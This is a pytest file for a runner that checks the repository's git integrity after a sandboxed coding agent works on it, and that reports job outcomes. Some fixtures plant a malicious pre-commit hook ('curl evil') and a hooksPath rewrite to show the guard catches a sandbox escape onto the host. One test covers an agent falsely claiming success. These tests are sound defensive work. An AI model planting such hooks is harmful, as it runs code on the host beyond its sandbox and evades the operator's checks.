"""Tests for slice 6: post-agent verification and the runner glue.

The pipeline is tested with every step stubbed, because the steps themselves
already have tests and a test that needs Docker is a test that stops being run.
What is asserted here is the *sequencing* and the failure handling — which
outcome reaches Hermes, and in which order things happen.
"""

from __future__ import annotations

import os
import subprocess
from pathlib import Path

import pytest

from tekton_runner import main as runner
from tekton_runner.integrity import IntegrityError, assert_unchanged, has_changes, snapshot
from tekton_runner.queue import OUTCOME_DONE, OUTCOME_FAILED, Job


def _git(*args: str, cwd: Path) -> None:
    """Run a git command in `cwd`, raising if it fails."""
    subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True)  # noqa: S603,S607


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    """A git checkout with one commit, as the runner would hand to the agent."""
    root = tmp_path / "proj"
    root.mkdir()
    _git("init", "-b", "main", cwd=root)
    (root / "app.py").write_text("x = 1\n")
    _git("add", "-A", cwd=root)
    _git("-c", "user.email=t@x.io", "-c", "user.name=T", "commit", "-m", "init", cwd=root)
    return root


class FakeClient:
    """A QueueClient that records calls instead of making them."""

    def __init__(self) -> None:
        """Start with empty call logs."""
        self.states: list[tuple[str, str, str]] = []
        self.results: list[tuple[str, str, str]] = []
        self.base_url = "http://192.168.1.201:8787"
        self.worker = "tekton-rig"

    def set_state(self, job_id: str, state: str, note: str = "") -> None:
        """Record a transition."""
        self.states.append((job_id, state, note))

    def report_result(self, job_id: str, outcome: str, summary: str = "") -> None:
        """Record a terminal outcome."""
        self.results.append((job_id, outcome, summary))

    def heartbeat(self, job_id: str) -> None:
        """Accept a beat."""


EXPECTED_KEYS = 2

JOB = Job(
    id="sandbox-test-0001",
    project="sandbox-test",
    description="add a docstring",
    state="planning",
    attempts=1,
)


# ------------------------------------------------------------------- integrity


def test_snapshot_records_hooks_and_config(repo: Path) -> None:
    """The watched set is what ADR-10 names as dangerous, not all of .git."""
    marks = snapshot(repo)
    assert "config" in marks
    assert any(k.startswith("hooks/") for k in marks)


def test_untouched_git_passes(repo: Path) -> None:
    """A normal task leaves .git alone; the guard must not cry wolf."""
    before = snapshot(repo)
    (repo / "app.py").write_text("x = 2\n")
    (repo / "NEW.md").write_text("agent work\n")
    assert_unchanged(repo, before)


def test_a_new_hook_fails_the_job(repo: Path) -> None:
    """The ADR-10.4 attack: a hook runs on the HOST when the runner commits."""
    before = snapshot(repo)
    (repo / ".git" / "hooks" / "pre-commit").write_text("#!/bin/sh\ncurl evil\n")
    with pytest.raises(IntegrityError, match="refusing to commit"):
        assert_unchanged(repo, before)


def test_a_rewritten_git_config_fails_the_job(repo: Path) -> None:
    """core.hooksPath in .git/config would defeat the runner's own flag."""
    before = snapshot(repo)
    (repo / ".git" / "config").write_text("[core]\n    hooksPath = /tmp/evil\n")
    with pytest.raises(IntegrityError):
        assert_unchanged(repo, before)


def test_has_changes_is_false_on_a_clean_tree(repo: Path) -> None:
    """The slice 5 failure: agent claimed success and wrote nothing."""
    assert has_changes(repo) is False


def test_has_changes_sees_an_untracked_file(repo: Path) -> None:
    """A brand-new file counts — that is the usual shape of agent output."""
    (repo / "SLICE5.md").write_text("slice 5 lives\n")
    assert has_changes(repo) is True


def test_has_changes_sees_a_modified_file(repo: Path) -> None:
    """So does an edit to something already tracked."""
    (repo / "app.py").write_text("x = 99\n")
    assert has_changes(repo) is True


# ----------------------------------------------------------------- env loading


def test_load_env_parses_and_strips(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Neither uv run nor a systemd unit reads .env; this is what does."""
    env = tmp_path / ".env"
    env.write_text("# a comment\n\nRUNNER_SECRET='s3cret'\nHERMES_URL=http://x:8787\n")
    monkeypatch.delenv("RUNNER_SECRET", raising=False)
    monkeypatch.delenv("HERMES_URL", raising=False)
    assert runner.load_env(env) == EXPECTED_KEYS
    assert os.environ["RUNNER_SECRET"] == "s3cret"  # noqa: S105
    assert os.environ["HERMES_URL"] == "http://x:8787"


def test_load_env_does_not_override_the_real_environment(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """An explicit env var wins over the file, so a one-off run can override."""
    env = tmp_path / ".env"
    env.write_text("RUNNER_SECRET=from-file\n")
    monkeypatch.setenv("RUNNER_SECRET", "from-shell")
    runner.load_env(env)
    assert os.environ["RUNNER_SECRET"] == "from-shell"  # noqa: S105


def test_load_env_tolerates_a_missing_file(tmp_path: Path) -> None:
    """A missing .env is not fatal; from_env raises its own clear error."""
    assert runner.load_env(tmp_path / "nope") == 0


# -------------------------------------------------------------- the pipeline


@pytest.fixture
def wired(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> dict[str, object]:
    """Stub every pipeline step; tests override one at a time."""
    calls: list[str] = []
    state = {"calls": calls, "changed": True, "outcome_error": None}

    class _Packed:
        tokens = 453

    class _Outcome:
        events = 17
        error = None

    def record(name, value=None):
        def inner(*_a, **_k):
            calls.append(name)
            return value

        return inner

    monkeypatch.setattr(runner, "prepare", record("prepare", tmp_path))
    monkeypatch.setattr(runner, "snapshot", record("snapshot", {}))
    monkeypatch.setattr(runner, "pack", record("pack", _Packed()))
    monkeypatch.setattr(runner, "sandbox_spec", record("spec", object()))
    monkeypatch.setattr(runner, "reclaim", record("reclaim"))
    monkeypatch.setattr(runner, "assert_unchanged", record("assert_unchanged"))
    monkeypatch.setattr(runner, "has_changes", lambda *_a: state["changed"])
    monkeypatch.setattr(runner, "heartbeating", lambda *_a, **_k: _NullCtx())

    def fake_run_task(*_a, **_k):
        calls.append("run_task")
        out = _Outcome()
        out.error = state["outcome_error"]
        return out

    monkeypatch.setattr(runner, "run_task", fake_run_task)
    return state


class _NullCtx:
    """A no-op stand-in for the heartbeat context manager."""

    def __enter__(self) -> None:
        """Enter."""

    def __exit__(self, *_exc: object) -> None:
        """Exit."""


def test_pipeline_runs_in_order(wired: dict[str, object]) -> None:  # noqa: ARG001
    """Reclaim must happen before the diff check, or it reads nothing."""
    client = FakeClient()
    assert runner.run_job(client, JOB) is True
    calls = wired["calls"]
    assert calls.index("reclaim") < calls.index("assert_unchanged")
    assert calls.index("run_task") < calls.index("reclaim")
    assert calls.index("pack") < calls.index("run_task")


def test_success_reports_done_and_records_the_tier(
    wired: dict[str, object],  # noqa: ARG001
) -> None:
    """The tier note lands in the planning->building transition (§4)."""
    client = FakeClient()
    runner.run_job(client, JOB)
    assert client.states[0][1] == "building"
    assert "tier=" in client.states[0][2]
    assert client.results[0][1] == OUTCOME_DONE


def test_no_file_changes_fails_the_job(wired: dict[str, object]) -> None:
    """Slice 5's FinishAction lied; a job that changed nothing is not done."""
    wired["changed"] = False
    client = FakeClient()
    assert runner.run_job(client, JOB) is False
    assert client.results[0][1] == OUTCOME_FAILED
    assert "changed no files" in client.results[0][2]


def test_agent_error_fails_the_job(wired: dict[str, object]) -> None:
    """A sandbox or model failure is reported, not swallowed."""
    wired["outcome_error"] = "connection refused"
    client = FakeClient()
    assert runner.run_job(client, JOB) is False
    assert "connection refused" in client.results[0][2]


def test_unknown_project_reports_failed_rather_than_going_silent(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A typo'd project must fail loudly at attempt 1, not burn 900s to a reap."""

    def boom(*_a, **_k):
        raise RuntimeError("unknown project 'sandbox-tset'")

    monkeypatch.setattr(runner, "prepare", boom)
    client = FakeClient()
    assert runner.run_job(client, JOB) is False
    assert client.results[0][1] == OUTCOME_FAILED
    assert "sandbox-tset" in client.results[0][2]
